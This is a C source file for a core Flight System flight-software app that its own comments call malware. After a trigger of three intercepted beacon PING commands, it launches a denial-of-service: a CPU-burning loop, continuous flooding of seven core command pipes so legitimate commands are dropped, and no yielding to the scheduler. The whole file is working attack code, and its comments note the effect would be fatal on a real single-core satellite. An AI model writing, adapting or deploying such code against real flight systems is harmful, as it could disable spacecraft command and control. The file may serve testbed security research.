#include "cfe.h"
#include "cfe_sb.h"
#include "cfe_es.h"
#include "cfe_evs.h"

/* Trigger: piggyback on BEACON_APP's command MID */
#define MALWARE_TRIGGER_MID 0x18F0
#define BEACON_PING_FC      2
#define TRIGGER_THRESHOLD   3

/* All 7 target command MIDs */
#define TARGET_ES_CMD_MID     0x1806
#define TARGET_EVS_CMD_MID    0x1801
#define TARGET_SB_CMD_MID     0x1803
#define TARGET_TIME_CMD_MID   0x1805
#define TARGET_TBL_CMD_MID    0x1804
#define TARGET_CI_LAB_CMD_MID 0x1884
#define TARGET_TO_LAB_CMD_MID 0x1880

typedef struct
{
    CFE_MSG_CommandHeader_t CmdHeader;
} NOISY_APP_Pkt_t;

void NOISY_APP_Main(void)
{
    uint32          RunStatus = CFE_ES_RunStatus_APP_RUN;
    NOISY_APP_Pkt_t SpamPacket;
    bool            AttackArmed = false;
    uint32          PingsSeen   = 0;

    CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    CFE_ES_WaitForStartupSync(10000);

    /* Setup the listener pipe */
    CFE_SB_PipeId_t  TriggerPipe;
    CFE_SB_Buffer_t *BufPtr;
    CFE_SB_CreatePipe(&TriggerPipe, 10, "MALWARE_PIPE");
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(MALWARE_TRIGGER_MID), TriggerPipe);

    CFE_SB_MsgId_t TargetMIDs[] = {
        CFE_SB_ValueToMsgId(TARGET_ES_CMD_MID),    CFE_SB_ValueToMsgId(TARGET_EVS_CMD_MID),
        CFE_SB_ValueToMsgId(TARGET_SB_CMD_MID),    CFE_SB_ValueToMsgId(TARGET_TIME_CMD_MID),
        CFE_SB_ValueToMsgId(TARGET_TBL_CMD_MID),   CFE_SB_ValueToMsgId(TARGET_CI_LAB_CMD_MID),
        CFE_SB_ValueToMsgId(TARGET_TO_LAB_CMD_MID)};
    int numTargets = sizeof(TargetMIDs) / sizeof(TargetMIDs[0]);

    CFE_EVS_SendEvent(1, CFE_EVS_EventType_INFORMATION,
                      "NOISY_APP: Active. Listening on BEACON MID 0x18F0. "
                      "Detonation after %d PINGs.",
                      (int)TRIGGER_THRESHOLD);

    while (CFE_ES_RunLoop(&RunStatus) == true)
    {
        if (AttackArmed == false)
        {
            int32 status = CFE_SB_ReceiveBuffer(&BufPtr, TriggerPipe, CFE_SB_POLL);
            if (status == CFE_SUCCESS)
            {
                CFE_SB_MsgId_t    RcvMsgId;
                CFE_MSG_FcnCode_t FcnCode = 0;
                CFE_MSG_GetMsgId(&BufPtr->Msg, &RcvMsgId);
                CFE_MSG_GetFcnCode(&BufPtr->Msg, &FcnCode);

                if (CFE_SB_MsgIdToValue(RcvMsgId) == MALWARE_TRIGGER_MID && FcnCode == BEACON_PING_FC)
                {
                    PingsSeen++;
                    CFE_EVS_SendEvent(3, CFE_EVS_EventType_INFORMATION, "NOISY_APP: PING #%u intercepted. %u of %u.",
                                      (unsigned int)PingsSeen, (unsigned int)PingsSeen,
                                      (unsigned int)TRIGGER_THRESHOLD);

                    if (PingsSeen >= TRIGGER_THRESHOLD)
                    {
                        AttackArmed = true;
                        CFE_EVS_SendEvent(2, CFE_EVS_EventType_CRITICAL,
                                          "NOISY_APP: THRESHOLD REACHED. MULTI-VECTOR ATTACK GO.");
                    }
                }
            }
            OS_TaskDelay(100);
        }
        else
        {
            /*
             * ============================================================
             * PHASE 2: MULTI-VECTOR ATTACK
             *
             * VECTOR 1 — CPU BURN (primary kill mechanism)
             *   Pure computation loop. No SB calls, so no pipe limits.
             *   Burns ~100ms of CPU per cycle. With priority 160 this
             *   runs whenever higher-priority tasks yield. On a real
             *   satellite with a single core, this alone is fatal.
             *
             * VECTOR 2 — SB PIPE SATURATION (keep pipes full)
             *   Send exactly DEFAULT_MSG_LIMIT (4) packets per target.
             *   More than 4 is wasted — the SB drops them silently.
             *   But keeping all 7 target pipes permanently full means
             *   legitimate commands get dropped.
             *
             * VECTOR 3 — NO YIELD
             *   No OS_TaskDelay(). The scheduler never gets a clean
             *   slot. Combined with Vector 1 burning CPU between SB
             *   calls, lower-priority tasks never execute.
             * ============================================================
             */

            /* VECTOR 1: CPU burn — exceed SCH's 500ms lag window */
            volatile uint64 burn = 0;
            for (volatile uint32 i = 0; i < 5000000; i++)
            {
                burn += i * i;
            }

            /* VECTOR 2: Keep all target pipes topped off (4 per pipe) */
            for (int t = 0; t < numTargets; t++)
            {
                CFE_MSG_Init((CFE_MSG_Message_t *)&SpamPacket, TargetMIDs[t], sizeof(SpamPacket));

                for (int i = 0; i < 4; i++)
                {
                    CFE_SB_TransmitMsg((CFE_MSG_Message_t *)&SpamPacket, true);
                }
            }

            /* VECTOR 3: No delay — loop immediately */
        }
    }

    CFE_ES_ExitApp(RunStatus);
}